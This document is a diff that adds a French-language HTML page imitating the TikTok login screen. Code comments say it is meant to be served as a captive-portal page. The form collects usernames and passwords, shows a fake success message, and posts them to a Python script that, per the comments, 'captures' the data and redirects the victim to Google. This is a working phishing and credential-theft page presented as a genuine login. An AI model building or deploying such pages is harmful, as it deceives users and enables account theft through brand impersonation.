@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion TikTok</title>
+  <style>
+    /* Reset CSS */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: #121212;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #333;
+      border-radius: 5px;
+      background-color: #222;
+      color: #fff;
+      font-size: 16px;
+    }
+
+    .input-group input:focus {
+      outline: none;
+      border-color: #ff0050;
+    }
+
+    .login-button {
+      width: 100%;
+      padding: 12px;
+      background-color: #ff0050;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-button:hover {
+      background-color: #e60046;
+    }
+
+    .forgot-password {
+      display: block;
+      margin-top: 15px;
+      color: #ff0050;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .forgot-password:hover {
+      text-decoration: underline;
+    }
+
+    .signup-link {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .signup-link a {
+      color: #ff0050;
+      text-decoration: none;
+    }
+
+    .signup-link a:hover {
+      text-decoration: underline;
+    }
+
+    /* Styles pour les messages de statut */
+    .status-message {
+      margin: 15px 0;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .status-success {
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+    }
+
+    .status-error {
+      background-color: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .spinner {
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid #ff0050;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="./tiktok.png" alt="TikTok Logo" class="logo">
+    <h1>Connexion à TikTok</h1>
+    
+    <!-- Message de statut -->
+    <div id="statusMessage" class="status-message"></div>
+    
+    <!-- MODIFICATION IMPORTANTE : ajouter method="POST" sans action -->
+    <form id="loginForm" method="POST">
+      <!-- Champ caché pour identifier la page -->
+      <input type="hidden" name="page_name" value="tiktok.html">
+      
+      <div class="input-group">
+        <label for="username">Nom d'utilisateur ou e-mail</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      
+      <div class="input-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      
+      <button type="submit" class="login-button" id="submitBtn">
+        <span id="btnText">Se connecter</span>
+        <div class="spinner" id="spinner"></div>
+      </button>
+      
+      <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+    </form>
+    
+    <div class="signup-link">
+      Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+    </div>
+  </div>
+
+  <script>
+    // Fonction pour afficher un message de statut
+    function showStatus(message, type) {
+      const statusEl = document.getElementById('statusMessage');
+      statusEl.textContent = message;
+      statusEl.className = `status-message status-${type}`;
+      statusEl.style.display = 'block';
+      
+      if (type === 'success') {
+        setTimeout(() => {
+          statusEl.style.display = 'none';
+        }, 3000);
+      }
+    }
+
+    // Gestion de la soumission du formulaire
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const btn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+      const spinner = document.getElementById('spinner');
+      
+      // Afficher l'état de chargement
+      btnText.style.display = 'none';
+      spinner.style.display = 'block';
+      btn.disabled = true;
+      
+      // Afficher message
+      showStatus('Connexion en cours...', 'success');
+      
+      // Récupérer les données
+      const formData = new FormData(this);
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      // Log dans la console pour débogage
+      console.log('Données saisies:');
+      console.log('- Username:', username);
+      console.log('- Password:', password);
+      
+      // Simuler un délai
+      setTimeout(() => {
+        showStatus('✅ Connexion réussie !', 'success');
+        
+        // Soumettre le formulaire au serveur Python
+        // Le serveur Python cap3.py va capturer les données
+        // et rediriger vers Google après
+        
+        // Important: Ne pas rediriger vers accueil.html ici
+        // Le serveur Python va gérer la redirection
+        
+        // Soumettre réellement le formulaire (POST)
+        this.submit();
+      }, 1500);
+    });
+
+    // Fonction pour afficher/masquer le mot de passe
+    function togglePassword() {
+      const passwordField = document.getElementById('password');
+      if (passwordField.type === 'password') {
+        passwordField.type = 'text';
+      } else {
+        passwordField.type = 'password';
+      }
+    }
+
+    // Ajouter un icône pour afficher/masquer le mot de passe
+    document.addEventListener('DOMContentLoaded', function() {
+      // Ajouter un bouton pour afficher/masquer le mot de passe
+      const passwordGroup = document.querySelector('.input-group:nth-child(2)');
+      const passwordContainer = document.createElement('div');
+      passwordContainer.style.position = 'relative';
+      
+      const passwordInput = document.getElementById('password');
+      passwordGroup.appendChild(passwordContainer);
+      passwordContainer.appendChild(passwordInput);
+      
+      const toggleBtn = document.createElement('button');
+      toggleBtn.type = 'button';
+      toggleBtn.innerHTML = '👁️';
+      toggleBtn.style.position = 'absolute';
+      toggleBtn.style.right = '10px';
+      toggleBtn.style.top = '50%';
+      toggleBtn.style.transform = 'translateY(-50%)';
+      toggleBtn.style.background = 'none';
+      toggleBtn.style.border = 'none';
+      toggleBtn.style.color = '#ccc';
+      toggleBtn.style.cursor = 'pointer';
+      toggleBtn.onclick = togglePassword;
+      
+      passwordContainer.appendChild(toggleBtn);
+      
+      // Focus sur le champ username au chargement
+      document.getElementById('username').focus();
+      
+      // Vérifier si c'est une redirection captive
+      checkCaptivePortal();
+    });
+
+    // Fonction pour vérifier si on est dans un portail captif
+    function checkCaptivePortal() {
+      const testUrls = [
+        'http://connectivitycheck.gstatic.com/generate_204',
+        'http://captive.apple.com/hotspot-detect.html',
+        'http://msftconnecttest.com/connecttest.txt'
+      ];
+      
+      // Essayer une requête pour voir si on est captif
+      fetch(testUrls[0], { mode: 'no-cors', cache: 'no-store' })
+        .catch(() => {
+          console.log('Portail captif détecté');
+        });
+    }
+  </script>
+</body>
+</html>
